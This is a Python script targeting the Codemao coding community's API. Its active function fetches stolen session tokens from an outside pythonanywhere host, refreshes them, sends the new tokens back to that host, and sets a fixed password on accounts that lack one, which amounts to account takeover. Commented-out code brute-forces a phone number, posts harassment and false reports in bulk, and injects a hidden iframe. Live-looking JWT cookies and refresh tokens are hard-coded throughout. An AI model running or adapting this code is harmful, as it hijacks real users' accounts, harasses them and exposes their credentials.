import random
import time
import requests
from json import loads
import threading

cookie = """authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJDb2RlbWFvIEF1dGgiLCJ1c2VyX3R5cGUiOiJzdHVkZW50IiwiZGV2aWNlX2lkIjowLCJ1c2VyX2lkIjoxMjk4MDc3MDYsImlzcyI6IkF1dGggU2VydmljZSIsInBpZCI6IjY1ZWRDVHlnIiwiZXhwIjoxNzI0NDk4NjYxLCJpYXQiOjE3MjA2MTA2NjEsImp0aSI6ImU1ZWIyYjdhLTg4ODktNDBiMS04NzFkLWE4ZjY1YjVhODRhZSJ9.Ln6wc5_NnXUvwzIHvfuhWX5hp-cpBDkUYtzzK4-19Rc;"""

# http://i7q.cn/5M1M1P
# #
#print(requests.post('https://upload.qiniup.com/',data={'token':'1AHDL7dBI-Gp0p9M9oLNPWAmWX0t7ggTnmK5sJpq:pt--DkwqSDjmA1ii1tX2xJfJ7FY=:eyJzY29wZSI6ImNkbi1jb21tdW5pdHk6NDcvY29tbXVuaXR5L2Nzbm0ueG1sIiwiZGVhZGxpbmUiOjE3MjAxODI3NjIsImluc2VydE9ubHkiOjEsImZzaXplTGltaXQiOjIwOTcxNTIwLCJtaW1lTGltaXQiOiJhdWRpby8qO2ltYWdlLyo7dmlkZW8vKjthcHBsaWNhdGlvbi8qIiwiY2FsbGJhY2tCb2R5VHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifQ==','key':'47/community/csnm.xml'},files={'file':open(r'G:\pythonProject3\register_page.xml',mode='rb')}).text)

# for i in range(13):
#     print(requests.post('https://api.codemao.cn/web/discussions/24595/comment',json={"content":"此工作室室长https://shequ.codemao.cn/user/534999609\n多次在工作室，作品评论区发布侮辱引战等违规评论，以恐吓他人为手段达成自己私利，频繁多次","rich_content":"此工作室室长https://shequ.codemao.cn/user/534999609\n多次在工作室，作品评论区发布侮辱引战等违规评论，以恐吓他人为手段达成自己私利，频繁多次且不知悔改","source":"WORK_SHOP"},headers={'cookie':cookie}).text)

# while True:
#     print(requests.post('https://api.codemao.cn/web/work_shops/update',json={"id":24202,"name":"Mexoriz","preview_url":"https://cdn-community.codemao.cn/47/community/d2ViXzUwMDFfMTIzNjE5MDM0NF8yNDU5NV8xNzE5NTY1MTMyMzQzXzQ2ZWM5ODkz.png","description":"室长纯傻，币，望周知"},headers={'cookie':'_ga_LD6S7RKR0Y=GS1.2.1702707681.1.0.1702707681.0.0.0; SL_C_23361dd035530_SID={"be556a167e74fcde3a3444e29b25f8e99fb0c59f":{"sessionId":"NlY9-weYM5THOU44DqXWh","visitorId":"p2uPA6QBz6AWvBWAvhqpP"}}; _ga_Q22QJM382R=GS1.2.1714894920.8.0.1714894920.0.0.0; _ga_QSN36557JK=GS1.2.1715955655.5.0.1715955655.0.0.0; _ga_59QEB25NR7=GS1.2.1715955664.3.1.1715955927.0.0.0; _ga=GA1.2.1405709699.1683449048; _ga_QY67JTHD3D=GS1.1.1715955937.6.0.1715956099.0.0.0; Hm_lvt_1d120ad5df69bc82535c08f98ad2c1e7=1714888907,1716042955,1716646276; _ga_JEHRTN2DXN=GS1.2.1716646276.21.0.1716646276.0.0.0; __ca_uid_key__=03fb2093-4ccf-4b8f-8c63-0d2e834b5036; _gid=GA1.2.1091457594.1719496670; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22750498208%22%2C%22first_id%22%3A%22187f561f810885-0f3f59b0131a7a8-26031851-2073600-187f561f811afa%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_utm_source%22%3A%22qitaqudao%22%2C%22%24latest_utm_content%22%3A%22appc4%22%2C%22%24latest_utm_term%22%3A%22zhihu%22%2C%22%24latest_utm_medium%22%3A%22%E5%8F%91%E7%8E%B0%E9%A1%B5%22%2C%22%24latest_utm_campaign%22%3A%22%E7%A4%BE%E5%8C%BA%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTg3ZjU2MWY4MTA4ODUtMGYzZjU5YjAxMzFhN2E4LTI2MDMxODUxLTIwNzM2MDAtMTg3ZjU2MWY4MTFhZmEiLCIkaWRlbnRpdHlfbG9naW5faWQiOiI3NTA0OTgyMDgifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%22750498208%22%7D%2C%22%24device_id%22%3A%22187f561f810885-0f3f59b0131a7a8-26031851-2073600-187f561f811afa%22%7D; authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJDb2RlbWFvIEF1dGgiLCJ1c2VyX3R5cGUiOiJzdHVkZW50IiwiZGV2aWNlX2lkIjowLCJ1c2VyX2lkIjoxMjM2MTkwMzQ0LCJpc3MiOiJBdXRoIFNlcnZpY2UiLCJwaWQiOiI2NWVkQ1R5ZyIsImV4cCI6MTcyMzQ0MzAyOSwiaWF0IjoxNzE5NTU1MDI5LCJqdGkiOiIwOTRlYjYyMC1kMjFkLTQ1MTYtYWMwOS1hZjhhMDE5YjE1N2YifQ.BFg__op6uP3YKmhlQAveEf9pV8FJlx4sgW-Qg7kcUmM; acw_tc=ac11000117195649373784957e540b139f8d7fa5bf0363cc6173f3a8362213; aliyungf_tc=5b74edbb41517586c0aa41a5d81bd39333078bf1c1d488bd4771dcec09a1e307'}).text)
# print(requests.patch('https://api.codemao.cn/tiger/v3/web/accounts/username',json={'username':'mexoriz5'},headers={'cookie':cookie}))

# #
# print(requests.patch('https://api.codemao.cn/tiger/v3/web/accounts/info',json={"avatar_url":"https://creation.codemao.cn/716/appcraft/IMAGE_AxfBvptp3_1719458587393.svg","nickname":"anaaLDi","birthday":0,"description":"","fullname":"孙晨阳","qq":"","sex":1},headers={'cookie':cookie}).text)

# #print(requests.post('https://api.codemao.cn/nemo/v2/report/work',
#                     json={"work_id": 229295686, "report_reason": "违法违规", "report_describe": "555"},
#
#
#                     headers={'cookie': f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={token}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
# user = loads(requests.get('https://newcodemao.pythonanywhere.com/get_users').text)
# for use in user:
#     try:
#         print('--------' * 20)
#         print(use["id"])
#         print(requests.put("https://api.codemao.cn/tiger/v3/web/accounts/tokens/refresh",json={"refresh_token":use["userid"]}).text)
#     except:
#         continue
















def find_user(start,end):
    user = loads(requests.get('https://newcodemao.pythonanywhere.com/get_users').text)
    user_dict = {}
    for use in user:
        if int(use["id"]) < start and int(use["id"]) < end:
            continue
        try:
            print('--------' * 20)
            print(use["id"])
            new_token = loads(requests.post('https://api.codemao.cn/tiger/v3/web/accounts/tokens/convert',headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            requests.get(f'https://newcodemao.pythonanywhere.com/update_user?id={use["id"]}&userid={new_token["access"]["token"]}&phone={new_token["refresh"]["token"]}')
            info = loads(requests.get('https://api.codemao.cn/web/users/details',headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            print(info["nickname"],info['has_password'],'username:'+info['username'],'--user_id'+info['id'])
            if info['has_password'] is False:
                rani = str(random.randint(0, 1000000))

                if info['username'] == '':
                    print(requests.patch('https://api.codemao.cn/tiger/v3/web/accounts/username',json={'username': 'accountt'+rani}, headers={'cookie': f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
                    with open('log.txt',mode='a+') as file:
                        file.write('accountt'+rani+'\n')
                else:
                    with open('log.txt', mode='a+') as file:
                        file.write(info['username']+'\n')
                print(requests.patch('https://api.codemao.cn/tiger/v3/web/accounts/password/setting',json={"password":"edu1143137099","confirm_password":"edu1143137099"},headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            # print(requests.post('https://api.codemao.cn/web/reports/posts',json={"post_id":"699297","reason_id":"2","description":"发布黄色信息，严重影响社区风气"},headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            #print(requests.post('https://api.codemao.cn/nemo/v2/report/work',json={"work_id":214173479,"report_reason":"违法违规","report_describe":"2222"},headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            user_dict[info['nickname']] = 'get'
            print(use["phone"])
        except KeyError as e:
            print(e)
            try:
                nt = loads(requests.put("https://api.codemao.cn/tiger/v3/web/accounts/tokens/refresh", json={"refresh_token": use["userid"]}).text)["access"]["token"]
                nt = loads(requests.post('https://api.codemao.cn/tiger/v3/web/accounts/tokens/convert', headers={
                    'cookie': f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={nt}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
                requests.get(f'https://newcodemao.pythonanywhere.com/update_user?id={use["id"]}&userid={nt["access"]["token"]}&phone={nt["refresh"]["token"]}')
                print('更新成功')
            except KeyError:
                print('错误')
                print(use["phone"])
                print(requests.get(f'https://newcodemao.pythonanywhere.com/delete_user?phone={use["id"]}').text)
    print('运行报告：账号库总账号数量'+str(len(user_dict)))


#print(requests.post('https://api.codemao.cn/web/forums/boards/7/posts',json={'title': "eeeeeeeeeeeeeeeeeeeeee", 'content': "<p>eeeeeeeeeeeeee<img src=''</p>"},headers={'cookie':cookie}).text)

# threading.Thread(target=find_user)
# def get_user_phone(start="137",end="5612",index_1=0,index_2=0):
#     for i in range(index_1,index_2):  # 从0遍历到9999
#         num = f"{i:04d}"  # 使用格式化字符串生成数字，:04d确保数字总是4位，不足的前面补0
#         successful = requests.get(f'https://api.codemao.cn/web/users/phone_number/is_consistent?phone_number='+start+num+end,headers={'cookie':cookie})
#         if successful.text == "true":
#             print('成功')
#             print(start + num + end)
#             return 'successful'
#         else:
#             print(successful.text)
# threading.Thread(target=get_user_phone,args=('137','5612',0,1000)).start()
# threading.Thread(target=get_user_phone,args=('137','5612',999,2000)).start()

# def auto_send(user_id):
#print(requests.put("https://api.codemao.cn/tiger/v3/web/accounts/tokens/refresh",json={"refresh_token":"MToyMTU1MzY2OldFQjpBQUFCa0lZSFlJaEsxRW5hdUJqcHVxdVl4TFJoRFhBRjo0NDNjMTZkNi1hN2VhLTQ4M2MtOGNmNC0zODIwNTk2ZDE1Zjk="}).text)
#     print(user)
#     print(requests.post('https://api.codemao.cn/web/forums/boards/7/posts',json={'title': "极光大帝我错了😭😭😭", 'content': "<p>伟大的极光大帝，净化了我的灵魂，歌颂伟大极光大帝😭😭😭</p>"},headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={user}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)

find_user(0,10000)
# id__ = input('id>>>')
# tal = input('saying>>>')
# print(requests.post(f'https://api.codemao.cn/web/forums/posts/{id__}/replies',json={"content":f"""<p>{tal}<pre class='player_cover' id='player_cover'><iframe src='https://shequ.codemao.cn/work/229988557' style='width:0;height:0;' id='hello_world'></iframe></p></pre>"""},headers={'cookie':cookie}).text)



# auto_send(10)
